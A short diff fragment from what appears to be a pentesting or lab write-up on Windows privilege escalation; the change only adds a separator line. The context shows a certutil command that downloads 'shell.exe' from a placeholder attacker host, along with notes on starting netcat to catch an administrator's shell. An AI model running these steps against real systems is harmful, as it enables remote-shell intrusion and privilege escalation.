@@ -30,3 +30,5 @@ certutil -urlcache -split -f http://IP/shell.exe o.exe
 1. **Then starts the netcat.**
 
 > If the admin loging to the window we got the admin's shell.
+
+---
